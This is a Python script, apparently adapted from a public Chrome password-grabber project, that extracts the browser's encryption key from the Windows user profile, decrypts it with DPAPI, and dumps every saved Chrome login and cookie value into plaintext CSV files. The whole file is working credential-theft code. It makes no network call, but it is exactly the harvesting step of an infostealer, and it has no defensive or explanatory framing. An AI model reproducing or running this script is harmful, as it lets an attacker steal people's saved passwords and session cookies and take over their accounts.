#!/usr/bin/env python3
#
# https://zhuanlan.zhihu.com/p/107801509
# https://github.com/agentzex/chrome_v80_password_grabber

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode() # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Error!"

def read_decrypt_db(csv_path, sql):
    master_key = get_master_key()
    conn = sqlite3.connect("temp")
    cursor = conn.cursor()
    with open(csv_path,'a+') as data:
        # try:
        cursor.execute(sql)
        for r in cursor.fetchall():
            data1 = r[0]
            data2 = r[1]
            encrypted_value = r[2]
            if encrypted_value[0:3] == b'v10':
                # Chrome > 80
                decrypted_value = decrypt_password(encrypted_value, master_key)
            else:
                # Chrome < 80
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
            data.write(data1 + ',' + data2 + ',' + decrypted_value + "\n")
        data.close()
        # except Exception as e:
        #     print('error')
    cursor.close()
    conn.close()
    try:
        os.remove("temp")
    except Exception as e:
        pass

def main():
    # Target File path
    Chrome_password_db_path = r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
    Chrome_cookies_db_path = r"AppData\Local\Google\Chrome\User Data\Default\Cookies"
    Chrome_history_db_path = r"AppData\Local\Google\Chrome\User Data\Default\History"
    Chrome_Bookmarks_file_path = r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    # Result file path
    Chrome_password_csv_path = "Chrome_password.csv"
    Chrome_cookies_csv_path = "Chrome_cookies.csv"
    Chrome_history_csv_path = "Chrome_history.csv"
    Chrome_bookmarks_csv_path = "Chrome_bookmars.csv"
    # Sql
    Login_Data_sql = "SELECT action_url, username_value, password_value FROM logins"
    Cookies_sql = "select host_key,name,encrypted_value from cookies"
    History_sql = ""
    # Get Chrome password
    target_db = os.environ['USERPROFILE'] + os.sep + Chrome_password_db_path
    shutil.copy2(target_db, "temp")
    read_decrypt_db(Chrome_password_csv_path, Login_Data_sql)
    # Get Chrome Cookies
    target_db = os.environ['USERPROFILE'] + os.sep + Chrome_cookies_db_path
    print(target_db)
    shutil.copy2(target_db, "temp")
    read_decrypt_db(Chrome_cookies_csv_path, Cookies_sql)



if __name__ == '__main__':
    main()